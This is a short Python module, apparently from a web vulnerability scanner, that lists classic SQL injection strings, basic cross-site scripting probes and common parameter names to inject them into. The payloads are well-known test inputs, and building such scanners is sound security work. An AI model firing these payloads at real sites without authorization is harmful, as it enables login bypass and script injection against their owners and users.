# payloads/payloads.py

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "admin'--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "<img src=x onerror=alert(1)>"
]

COMMON_PARAM_NAMES = [
    "id",
    "page",
    "q",
    "search",
    "username",
    "password"
]
